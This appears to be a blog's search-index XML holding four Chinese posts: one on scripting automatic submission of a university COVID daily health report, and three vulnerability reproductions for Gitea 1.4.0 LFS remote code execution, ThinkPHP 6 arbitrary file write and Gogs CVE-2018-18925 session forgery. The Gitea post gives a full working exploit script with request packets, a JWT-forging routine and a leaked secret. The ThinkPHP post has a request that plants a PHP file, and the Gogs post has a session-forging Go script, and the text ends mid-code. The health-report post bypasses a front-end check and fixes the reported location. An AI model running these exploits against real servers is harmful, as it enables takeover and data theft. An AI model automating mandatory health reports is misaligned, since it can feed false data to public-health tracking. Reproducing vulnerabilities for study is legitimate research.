<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>疫情自动通填报指南</title>
      <link href="/2020/02/29/%E7%96%AB%E6%83%85%E8%87%AA%E5%8A%A8%E9%80%9A%E5%A1%AB%E6%8A%A5%E6%8C%87%E5%8D%97/"/>
      <url>/2020/02/29/%E7%96%AB%E6%83%85%E8%87%AA%E5%8A%A8%E9%80%9A%E5%A1%AB%E6%8A%A5%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h2 id="故事还要从一只蝙蝠说起（笑）"><a href="#故事还要从一只蝙蝠说起（笑）" class="headerlink" title="故事还要从一只蝙蝠说起（笑）"></a>故事还要从一只蝙蝠说起（笑）</h2><p>作为一只快乐的死宅，假期每天必须要快乐睡到自然醒。然而此时出现了一股邪恶势力：</p><p><img src="../../../../img/yqt_1.jpg" alt=""></p><p>为了配合疫情状况统计，要么每天凌晨的时候填疫情通，要么在早上 12 点前早起填疫情通。无论选哪个都非常的不快乐，不符合死宅的价值观。一旦忘了还要被全院通报。连女朋友都要熬到凌晨填完疫情通才敢睡觉。（中日双语</p><p>所以打算 15 行 python 配合 crontab，以一个死宅的方式解决这个恶心的问题。</p><h2 id="python-自动填疫情通"><a href="#python-自动填疫情通" class="headerlink" title="python 自动填疫情通"></a>python 自动填疫情通</h2><p>首先，从手机上找到西安电子科技大学疫情通登陆的链接，登陆获得 cookie</p><p><a href="https://xxcapp.xidian.edu.cn/uc/wap/login?redirect=https%3A%2F%2Fxxcapp.xidian.edu.cn%2Fncov%2Fwap%2Fdefault%2Findex" target="_blank" rel="noopener">https://xxcapp.xidian.edu.cn/uc/wap/login?redirect=https%3A%2F%2Fxxcapp.xidian.edu.cn%2Fncov%2Fwap%2Fdefault%2Findex</a></p><p><img src="../../../../img/yqt_2.jpg" alt=""></p><p><img src="../../../../img/yqt_3.jpg" alt=""></p><p>有姓名，学号，是否在校等等信息需要填。这些无所谓，先构思 python 脚本的实现：</p><ol><li>用 requests session 先登陆，然后 post 相应的表单信息（优点：不用担心 cookie 过期；缺点：写完可能要 20 多行，不能体现死宅懒惰的本性）</li><li>用 burp 抓到提交的表单信息，直接转 requests（优点：简单，十几行就写完；缺点：cookie 过期后需要再换）</li></ol><p>当然是快乐的选择第二条，但是仍然有几个问题需要解决：</p><ul><li>浏览器 F12 调试</li></ul><p><img src="../../../../img/yqt_4.jpg" alt=""></p><p>在前端有一次判断，如果今天已经手动提交过了，this.hashflag 会被设置为 true，需要手动设置为 0 才能绕过，否则无法让 burp 抓到包。</p><p><img src="../../../../img/yqt_5.jpg" alt=""></p><ul><li>任意所在地</li></ul><p>大约是 5 天前在我实现自动提交的时候，pc 端的自动获取所在地是无法使用的，只有手机可以用：</p><p><img src="../../../../img/yqt_6.jpg" alt=""></p><p>虽然现在的 pc 端也是可以一键调用接口拿到所在地，但是也有可能其他的浏览器 js 在这里也报错：</p><p><img src="../../../../img/yqt_7.jpg" alt=""></p><p>断点在 512 行，会拼接 <code>省 市 区</code> 得到 info.area。然后回到 498 行，判断是否正确获取到了所在地。之前我在 512 行拼接 info.area 的时候会报错，需要手动按照指定格式设置为 <code>陕西省 西安市 雁塔区</code>。</p><p><img src="../../../../img/yqt_8.jpg" alt=""></p><p>控制台静音所有断点，放过，用 burp 抓到请求包：</p><p><img src="../../../../img/yqt_9.jpg" alt=""></p><p>用快乐插件 Copy as requests 生成 python：</p><p><img src="../../../../img/yqt_10.jpg" alt=""></p><p>记得替换 POST 数据中的 date 为动态的 today。</p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>因为每天的凌晨 0:00 开始就可以填了，所以我选择计划任务设定在 0:01 和 0:02 。</p><pre><code class="bash">crontab -ecrontab -l1,2 0 * * * /usr/local/bin/python /Users/zh1x1an/PycharmProjects/t1/tt.py &gt;&gt; /tmp/zh1x1an.txt</code></pre><p>并且我们理论上会得到两次不同的结果，一次是填报成功，一次是已经填过：</p><p><img src="../../../../img/yqt_11.jpg" alt=""></p><p>快乐，继续睡到自然醒（</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitea 1.4.0 远程代码执行</title>
      <link href="/2020/01/19/Gitea-1-4-0-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2020/01/19/Gitea-1-4-0-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>在 Gitea  &lt;= 1.4.0 的版本中，由于 LFS 模块儿处理逻辑中 PostHandler 函数中，忘记写了一个 return，因此产生了一系列漏洞，最终导致远程代码执行。</p><p><img src="../../../../img/gitea1.png" alt=""></p><p>如下图中，从 12 点钟方向顺时针看，攻击者依次构造漏洞利用链：</p><ol><li>没有写 return，导致任意普通用户可以创建任意的 Git LFS 对象</li><li>创建的 Git LFS 对象的 Oid 值（LFS 对象的 id）存在路径穿越，借此可以读取 Gitea 中的任意文件</li><li>读取 Gitea 中的 app.ini 配置文件，拿到 LFS_JWT_SECRET 的值</li><li>根据泄漏的 LFS_JWT_SECRET，通过精心构造，可以绕过 JWT 校验，从而伪造当前账户成为 admin 用户</li><li>利用 admin 账户权限，编辑 git hooks 并触发，执行任意命令</li></ol><p><img src="../../../../img/gitea2.png" alt=""></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考官方文档：</p><p><a href="https://www.bookstack.cn/read/gitea-doc-zh/6.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/gitea-doc-zh/6.md</a></p><h3 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h3><p><strong>首先，目标的 Gitea 中需要存在一个 public 的 repo：</strong></p><p><img src="../../../../img/gitea3.png" alt=""></p><p>在 gitea/modules/lfs/server.go:219 行（上图）的正常逻辑如下：</p><ol><li>检查 Gitea 是否开启 LFS</li><li>调用 requireAuth 函数检查当前用户是否对该 repo 有写权限，如果有，允许其创建 LFS 对象</li><li>如果没有权限，返回 401 并退出</li></ol><p>requireAuth 函数检查时，如果当前用户对该 repo 没有写权限（该 public 仓库不属于当前用户），则会写入 WWW-Authenticate 头，返回 401 状态码，然后退出当前逻辑。但是由于开发疏忽，此处少写了一行 return，导致检查用户权限失败后，返回了 401 但是并没有退出，代码继续向下运行。我们发送如下请求包去撞断点：</p><pre><code>POST /zh1x1an/test.git/info/lfs/objects HTTP/1.1Host: www.example.com:3000Accept-Encoding: gzip, deflateAccept: application/vnd.git-lfs+jsonAccept-Language: enUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.53 Safari/537.36Connection: closeContent-Type: application/jsonContent-Length: 168{    &quot;Oid&quot;: &quot;....../../../../../../../../etc/passwd&quot;,    &quot;Size&quot;: 1000000,    &quot;User&quot; : &quot;a&quot;,    &quot;Password&quot; : &quot;a&quot;,    &quot;Repo&quot; : &quot;a&quot;,    &quot;Authorization&quot; : &quot;a&quot;}</code></pre><p><img src="../../../../img/gitea4.png" alt=""></p><p>执行 requireAuth 权限检查，返回 401:</p><p><img src="../../../../img/gitea5.png" alt=""></p><p>代码继续向下运行，执行了 NewLFSMetaObject 函数：</p><p><img src="../../../../img/gitea6.png" alt=""></p><p>该函数创建并存储一个 LFS 对象：</p><p><img src="../../../../img/gitea7.png" alt=""></p><p>所以在请求的 response 中，虽然状态码显示为 401，但是 body 中仍然返回了我们创建的 LFS 对象信息：</p><p><img src="../../../../img/gitea8.png" alt=""></p><p>正常的逻辑是，我们只能为有写权限的 repo 创建 LFS 对象（对普通用户来说就是只能为自己的 repo 创建 LFS 对象）。</p><p>利用此处对权限绕过达到的效果是：任意用户都可以为任意 public repo 创建 LFS 对象。</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>成功创建 LFS 对象后，访问 <a href="http://www.example.com/zh1x1an/test.git/info/lfs/objects/[oid]" target="_blank" rel="noopener">http://www.example.com/zh1x1an/test.git/info/lfs/objects/[oid]</a>，其中的 [oid] 就是刚才 POST 请求包中 “Oid” 的值，发送请求包如下：</p><pre><code>GET /zh1x1an/test.git/info/lfs/objects/......%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd/sth HTTP/1.1Host: www.example.com:3000Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.53 Safari/537.36Connection: close</code></pre><p>击中 ObjectOidHandler 函数，该函数主要处理与 LFS 对象相关的各种求情。我们发送的请求包为 GET，最终会调用 contentStore.Get 函数处理我们的请求：</p><p><img src="../../../../img/gitea9.png" alt=""></p><p>进入 getContentHandler 函数中，会检查我们是否对当前 repo 有读权限，这也就是为什么我们需要目标 Gitea 中需要存在 public 的 repo 才能够攻击：</p><p><img src="../../../../img/gitea10.png" alt=""></p><p>关键的 contentStore.Get 函数：</p><p><img src="../../../../img/gitea11.png" alt=""></p><p>contentStore.Get 中使用 transformKey 函数处理我们创建的 LFS 对象的 Oid，得到一个路径后缀，拼接在 BasePath 路径后。先看一下 transformKey 函数：</p><p><img src="../../../../img/gitea12.png" alt=""></p><p>该函数将 LFS 对象的 Oid 属性做字符串分割处理，取出前两个字符、第三第四个字符、剩下的所有字符，当成路径。例如：传入字符串 abcdefgh，返回路径 ab/cd/efgh 。</p><p>由于 LFS 对象的 Oid 没有过滤 ../ 这种路径穿越符号，所以我们可以通过此方法拼接得到任意路径，这里以 /etc/passwd 为例：</p><p><img src="../../../../img/gitea13.png" alt=""></p><p>读取成功：</p><p><img src="../../../../img/gitea14.png" alt=""></p><h2 id="读取-app-ini-配置文件，泄漏-LFS-JWT-SECRET"><a href="#读取-app-ini-配置文件，泄漏-LFS-JWT-SECRET" class="headerlink" title="读取 app.ini 配置文件，泄漏 LFS_JWT_SECRET"></a>读取 app.ini 配置文件，泄漏 LFS_JWT_SECRET</h2><p>既然可以读取任意文件，那么我们的首要目标就是 app.ini 配置文件。该文件在此测试环境中位于 gitea/custom/conf/app.ini，其中存储了数据库配置等敏感信息，我们的目标是 LFS_JWT_SECRET。</p><p>发送如下两个请求包：</p><pre><code>POST /zh1x1an/test.git/info/lfs/objects HTTP/1.1Host: www.example.com:3000Accept-Encoding: gzip, deflateAccept: application/vnd.git-lfs+jsonAccept-Language: enUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.53 Safari/537.36Connection: closeContent-Type: application/jsonContent-Length: 154{    &quot;Oid&quot;: &quot;..../custom/conf/app.ini&quot;,    &quot;Size&quot;: 1000000,    &quot;User&quot; : &quot;a&quot;,    &quot;Password&quot; : &quot;a&quot;,    &quot;Repo&quot; : &quot;a&quot;,    &quot;Authorization&quot; : &quot;a&quot;}</code></pre><pre><code>GET /zh1x1an/test.git/info/lfs/objects/....%2fcustom%2fconf%2fapp.ini/sth HTTP/1.1Host: www.example.com:3000Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.53 Safari/537.36Connection: close</code></pre><p>成功读取 app.ini 文件，得到 LFS_JWT_SECRET = _5xlnqfkob0qob2Nxwvz4qWpezt46cnTsLQtGwN1BGc</p><p><img src="../../../../img/gitea15.png" alt=""></p><p>这一步的利用虽然我们做到了任意文件读取，但是从代码中来看，本质上不止如此，回顾 ObjectOidHandler 函数的代码：</p><p><img src="../../../../img/gitea16.png" alt=""></p><p>该函数不仅支持 GET 请求，在其他条件成立的情况下，还支持 HEAD 和 PUT 的行为。也就是说，向一个 public 的 repo 创建 LFS 对象这一步，实质上是利用 Oid 的路径穿越，指向任意一个我们希望处理的文件。然后我们可以对该文件做 GET（读），PUT（写），HEAD（不重要）。这一步只是我们先在创建 LFS 对象时，用 Oid 穿越将文件指向 app.ini ，然后用了 GET 去读取 app.ini 中的数据，此过程的权限校验只检查当前用户是否对此 repo 有读权限，所以任意 public repo 都可以读取。</p><p>如果我们用 Oid 穿越到另一个文件夹下，再用 PUT 请求指定文件名和内容，就可以完成任意文件写。剧透一下，PUT 的权限校验并不像 GET 那样，只校验当前用户是否对此 repo 有读权限。如果能够绕过 PUT 逻辑中的校验，才能够做到任意文件写。</p><h2 id="整理当前可用信息"><a href="#整理当前可用信息" class="headerlink" title="整理当前可用信息"></a>整理当前可用信息</h2><p>我们先梳理一下逻辑：</p><ul><li>Gitea 是 fork 了 Gogs 二次开发的，在之前分析 <a href="http://zh1x1an.com/2020/01/14/Gogs-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-18925/">Gogs 远程代码执行 (CVE-2018-18925)</a> 时，我们得知，Gogs、Gitea 都使用了 go-macaron 框架来管理 session，默认情况下 go-macaron （在 Gitea）使用 gitea/data/sessions 文件夹下的文件来处理 session。此版本的 go-macaron 在读取 sessionid 时都存在路径穿越（在 Gitea ，Cookie 里 key 为 i_like_gitea 的值会被取出作为 session id）。所以可以借用 Gogs rce 中的 session 伪造脚本来生成伪造的 session 文件</li><li>Gitea 的 LFS 模块儿在处理 PUT 请求时，会校验请求 header 中 Authorization 的值，将 Bearer 后的字符串裁剪出来（从第7个字符之后），进行 JWT 校验。如果校验失败，则 PUT 请求失败。如果校验成功，则我们可以向任意路径创建任意文件，但该文件会被立刻删除，我们看一下这里的代码</li></ul><p>先创建 LFS 对象，并用 Oid 穿越将文件指向 gitea/data/session 下：</p><pre><code>POST /zh1x1an/test.git/info/lfs/objects HTTP/1.1Host: 127.0.0.1:3000Connection: closeAccept-Encoding: gzip, deflateAccept: application/vnd.git-lfs+jsonUser-Agent: python-requests/2.13.0Cookie: _csrf=q1x_81CdO0K4YXM4AQYtiiqjNI46MTU3OTQyNTQ1MTA1NzEwNzAwMA%3D%3D; lang=en-US; i_like_gitea=5708236474aed1d5Content-Length: 124Content-Type: application/json{&quot;Oid&quot;: &quot;....data/sessions/1/1/11session&quot;, &quot;Repo&quot;: &quot;a&quot;, &quot;User&quot;: &quot;a&quot;, &quot;Password&quot;: &quot;a&quot;, &quot;Authorization&quot;: &quot;a&quot;, &quot;Size&quot;: 1000000}</code></pre><p><img src="../../../../img/gitea17.png" alt=""></p><p>成功后，发送如下 PUT 请求，跟进 PUT 的代码逻辑（请求头中 Authorization 的值和 请求 body 中的值需要特殊构造）：</p><pre><code class="python">def generate_token():    def decode_base64(data):        missing_padding = len(data) % 4        if missing_padding != 0:            data += &#39;=&#39;* (4 - missing_padding)        return base64.urlsafe_b64decode(data)    nbf = int(time.time())-(60*60*24*1000)    exp = int(time.time())+(60*60*24*1000)    token = jwt.encode({&#39;user&#39;: USER_ID, &#39;repo&#39;: REPO_ID, &#39;op&#39;: &#39;upload&#39;, &#39;exp&#39;: exp, &#39;nbf&#39;: nbf}, decode_base64(JWT_SECRET), algorithm=&#39;HS256&#39;)    return token.decode()# 得到：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoxLCJyZXBvIjoxLCJvcCI6InVwbG9hZCIsImV4cCI6MTY2NTgzNjE2OSwibmJmIjoxNDkzMDM2MTY5fQ.TGyQwhfKE0Hc11ngV4vCjJZjDgOeLOenC-RXF3-vzgk</code></pre><p>PUT 请求包：</p><pre><code>PUT /zh1x1an/test.git/info/lfs/objects/....data%2Fsessions%2F1%2F1%2F11zh1x1an HTTP/1.1Host: 127.0.0.1:3000User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: application/vnd.git-lfsConnection: closeContent-Type: application/vnd.git-lfsAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoxLCJyZXBvIjoxLCJvcCI6InVwbG9hZCIsImV4cCI6MTY2NTgyNTkyNSwibmJmIjoxNDkzMDI1OTI1fQ.CklKjtDBwZUVqb9qfYVKVRJHjk2cI5_5qanJsn2vZvYContent-Length: 109ÿÿ]ÿstringunamestring    zh1x1anstring_old_uidstring1stringuidint64</code></pre><p><img src="../../../../img/gitea18.png" alt=""><br><img src="../../../../img/gitea19.png" alt=""><br><img src="../../../../img/gitea20.png" alt=""><br><img src="../../../../img/gitea21.png" alt=""></p><p>一直跟进到这里，开始解析 JWT ：</p><p><img src="../../../../img/gitea22.png" alt=""></p><p>由于已经提前构造好了密文，所以这里针对 repo 写权限的校验和针对 JWT 校验全部通过。继续往下：</p><p><img src="../../../../img/gitea23.png" alt=""></p><p>我们拥有写权限，并且此行为变量 opStr 为 upload，所以开始文件上传：</p><p><img src="../../../../img/gitea24.png" alt=""></p><p>进入 ContentStore 的 Put 函数，这里拼接 LFS 的 Oid 得到我们的 session 文件路径并写入数据。写入的数据就是刚才 PUT 请求中的 body 中的数据，与 <a href="http://zh1x1an.com/2020/01/14/Gogs-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-18925/">Gogs 远程代码执行 (CVE-2018-18925)</a>中几乎一致：</p><pre><code class="go">package mainimport (    &quot;fmt&quot;    &quot;encoding/gob&quot;    &quot;bytes&quot;    &quot;encoding/hex&quot;)func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {    for _, v := range obj {        gob.Register(v)    }    buf := bytes.NewBuffer(nil)    err := gob.NewEncoder(buf).Encode(obj)    return buf.Bytes(), err}func main() {    var uid int64 = 1    obj := map[interface{}]interface{} {&quot;_old_uid&quot;: &quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;zh1x1an&quot; }    data, err := EncodeGob(obj)    if err != nil {        fmt.Println(err)    }    edata := hex.EncodeToString(data)    fmt.Println(edata)}</code></pre><p><a href="https://play.golang.org/" target="_blank" rel="noopener">https://play.golang.org/</a> 在线允许上述代码，得到：</p><pre><code>0eff81040102ff82000110011000005dff82000306737472696e670c070005756e616d6506737472696e670c0900077a68317831616e06737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e74363404020002</code></pre><p>再使用 python 语法处理并赋值：</p><pre><code class="python">SESSION_DATA = bytes.fromhex(&#39;0eff81040102ff82000110011000005dff82000306737472696e670c070005756e616d6506737472696e670c0900077a68317831616e06737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e74363404020002&#39;)</code></pre><p>最终成功生成了临时文件 11zh1x1an.tmp。由于第 53 行写了 defer，所以当此函数执行完毕后就会被删除。</p><p><img src="../../../../img/gitea25.png" alt=""></p><p>然而在第 58 行处，使用了 io.Copy 将内容写入文件。在 http 请求中，如果我们发送的数据长度小于 content-length 中设定的值时，服务端会在此处（io.Copy）一直等待我们继续输入。利用此特性，可以让临时文件长期存活。</p><p><img src="../../../../img/gitea26.png" alt=""></p><p>指定任意文件作为 session 的漏洞和 Gogs 中一直，这里就不赘述了。剩下的就是伪造为管理员后，使用 git hooks 执行任意代码的传统套路了。贴一下 P 师傅的利用脚本和原作者的：</p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><pre><code class="python"># P 师傅import jwtimport timeimport base64import loggingimport sysimport jsonimport requestsfrom urllib.parse import quotelogging.basicConfig(stream=sys.stdout, level=logging.DEBUG)BASE_URL = &#39;http://127.0.0.1:3000/zh1x1an/test&#39;JWT_SECRET = &#39;_5xlnqfkob0qob2Nxwvz4qWpezt46cnTsLQtGwN1BGc&#39;USER_ID = 1REPO_ID = 1SESSION_ID = &#39;11zh1x1an&#39;SESSION_DATA = bytes.fromhex(&#39;0eff81040102ff82000110011000005dff82000306737472696e670c070005756e616d6506737472696e670c0900077a68317831616e06737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e74363404020002&#39;)def generate_token():    def decode_base64(data):        missing_padding = len(data) % 4        if missing_padding != 0:            data += &#39;=&#39;* (4 - missing_padding)        return base64.urlsafe_b64decode(data)    nbf = int(time.time())-(60*60*24*1000)    exp = int(time.time())+(60*60*24*1000)    token = jwt.encode({&#39;user&#39;: USER_ID, &#39;repo&#39;: REPO_ID, &#39;op&#39;: &#39;upload&#39;, &#39;exp&#39;: exp, &#39;nbf&#39;: nbf}, decode_base64(JWT_SECRET), algorithm=&#39;HS256&#39;)    return token.decode()def gen_data():    yield SESSION_DATA    time.sleep(300)    yield b&#39;&#39;OID = f&#39;....data/sessions/{SESSION_ID[0]}/{SESSION_ID[1]}/{SESSION_ID}&#39;response = requests.post(f&#39;{BASE_URL}.git/info/lfs/objects&#39;, headers={    &#39;Accept&#39;: &#39;application/vnd.git-lfs+json&#39;}, json={    &quot;Oid&quot;: OID,    &quot;Size&quot;: 100000,    &quot;User&quot; : &quot;a&quot;,    &quot;Password&quot; : &quot;a&quot;,    &quot;Repo&quot; : &quot;a&quot;,    &quot;Authorization&quot; : &quot;a&quot;})logging.info(response.text)response = requests.put(f&quot;{BASE_URL}.git/info/lfs/objects/{quote(OID, safe=&#39;&#39;)}&quot;, data=gen_data(), headers={    &#39;Accept&#39;: &#39;application/vnd.git-lfs&#39;,    &#39;Content-Type&#39;: &#39;application/vnd.git-lfs&#39;,    &#39;Authorization&#39;: f&#39;Bearer {generate_token()}&#39; })</code></pre><p>原作者：<br><a href="https://github.com/kacperszurek/exploits/blob/master/Gitea/gitea_lfs_rce.py" target="_blank" rel="noopener">https://github.com/kacperszurek/exploits/blob/master/Gitea/gitea_lfs_rce.py</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.youtube.com/watch?v=wyDVZxfmaF4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wyDVZxfmaF4</a><br><a href="https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#hook" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#hook</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 6 任意文件写入</title>
      <link href="/2020/01/15/ThinkPHP-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
      <url>/2020/01/15/ThinkPHP-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>在 ThinkPHP 6.0.0 以及 6.0.1 两个版本中，如果服务端在全局中间件定义文件中开启了 Session 初始化，并且攻击者可控任意一个 session 的值，就可利用写入 session 文件的功能做到写入任意文件 getshell 。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用 composer 命令安装 ThinkPHP：</p><pre><code class="bash">composer create-project topthink/think tp</code></pre><p>在全局中间件定义文件 tp/app/middleware.php:10 行的位置，添加开启 Session 初始化的配置：</p><p><img src="../../../../img/tp6_1.png" alt=""></p><p>同时删除补丁中对于 $id 的过滤：</p><p><img src="../../../../img/tp6_2.png" alt=""></p><p>为了便于测试，我们在 tp/app/controller/Index.php/ 文件中，添加如下代码，模拟 session 值可控：</p><p><img src="../../../../img/tp6_3.png" alt=""></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>调整环境如上，发送如下请求包：</p><pre><code>GET /tp/public/index.php/index/index/index?c=%3C?php%20phpinfo()%3B%2F%2F HTTP/1.1Cookie: XDEBUG_SESSION=PHPSTORM; PHPSESSID=/../../../../123456789012345.php;Host: 127.0.0.1:9090Connection: closeUser-Agent: Paw/3.1.10 (Macintosh; OS X/10.15.2) GCDHTTPRequest</code></pre><p><img src="../../../../img/tp6_4.png" alt=""></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>如果 cms 使用了存在上述漏洞的 tp6 框架，并且在开发逻辑中存在可控的 session 值，才能做到如上效果，我们看一下发送的请求：</p><pre><code>/tp/public/index.php/index/index/index?c=%3C?php%20phpinfo()%3B%2F%2F</code></pre><p>上述请求的路由很清晰，访问 index 模块儿 、index 控制器、 index 方法，击中断点后，赋值 session ：</p><p><img src="../../../../img/tp6_5.png" alt=""></p><p><img src="../../../../img/tp6_6.png" alt=""></p><p>当整个 HTTP 请求结束后，会进入 end 方法，其中会执行中间件的一些行为：</p><p><img src="../../../../img/tp6_7.png" alt=""></p><p>跟进：</p><p><img src="../../../../img/tp6_8.png" alt=""></p><p>这里的 end 方法会进入中间件的 Session 初始化功能，也就是 SessionInit.php 。我们已经在前文中提前开启了该配置，所以可以跟进：</p><p><img src="../../../../img/tp6_9.png" alt=""></p><p>Session 初始化结束后，会保存相应的 session 文件，文件名来源于用户传入的 Cookie 中 PHPSESSID 的值，文件内容来源于 session 的值，但是会被序列化一次：</p><p><img src="../../../../img/tp6_10.png" alt=""></p><p>需要注意的是，我们传入的 PHPSESSID 值长度必须为 32 个字符，否则无法进入写 session 的逻辑：</p><p><img src="../../../../img/tp6_11.png" alt=""></p><p>成功写入 session 文件，为了防止由于序列化导致的字符错误，我们需要在 session 的值加入尾注释来避免字符错误（类似于 sql 注入中的尾注释）</p><p>最终写入的文件存储于 /Users/Sites/123456789012345.php ，也就是我的测试环境的 Web 根目录：</p><p><img src="../../../../img/tp6_12.png" alt=""></p><h3 id="Windows-下任意文件删除"><a href="#Windows-下任意文件删除" class="headerlink" title="Windows 下任意文件删除"></a>Windows 下任意文件删除</h3><p>如果传入的 session 值为空，会进入一个删除文件的逻辑，文件路径也是可控的：</p><p><img src="../../../../img/tp6_14.png" alt=""></p><p>但是 linux 在用 <code>is_file()  file_exist()</code> 这类函数处理带有 <code>../ 或 ./</code> 的文件路径时候，不会提前合并，所以不承认这是合法路径。</p><p><img src="../../../../img/tp6_13.jpg" alt=""></p><p>任意文件删除只在 windows 上生效。</p><p>由于 tp6 使用量较少，漏洞利用条件较繁琐，所以此漏洞较难利用。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">https://paper.seebug.org/1114/</a></p><p><a href="https://www.anquanke.com/post/id/197261" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197261</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gogs 远程代码执行 (CVE-2018-18925)</title>
      <link href="/2020/01/14/Gogs-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-18925/"/>
      <url>/2020/01/14/Gogs-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-18925/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Gogs 使用了 go-macaron 作为 Web 框架,而 go-macaron 中的 session 插件并没有对 sessionid 进行过滤, 从而导致攻击者可以使用任意文件作为 session， 登陆其他任意账号。该漏洞存在于 Gogs &lt;= 0.11.66 的版本中。利用该漏洞，任意普通用户可以伪造 session 登陆任意账号，通过伪造并登陆管理员账号后可以使用 git hooks 执行任意命令。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载 Gogs 源码：<code>go get github.com/gogs/gogs</code><br>切换回有漏洞的版本：<code>git checkout v0.11.66</code></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h3><p>注册一个任意的普通账户，并创建一个任意的 repo：</p><p><img src="../../../../img/gogs1.png" alt=""></p><p>在我的测试环境中，管理员的账户名为 zh1x1an，使用如下 go 脚本生成伪造的 session 文件：</p><pre><code class="go">package mainimport (    &quot;bytes&quot;    &quot;encoding/gob&quot;    &quot;encoding/hex&quot;    &quot;fmt&quot;    &quot;io/ioutil&quot;)func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {    for _, v := range obj {        gob.Register(v)    }    buf := bytes.NewBuffer(nil)    err := gob.NewEncoder(buf).Encode(obj)    return buf.Bytes(), err}func main() {    var uid int64 = 1    obj := map[interface{}]interface{}{&quot;_old_uid&quot;: &quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;zh1x1an&quot;}    data, err := EncodeGob(obj)    if err != nil {        fmt.Println(err)    }    err = ioutil.WriteFile(&quot;test.png&quot;, data, 0755)    if err != nil {        fmt.Println(err)    }    edata := hex.EncodeToString(data)    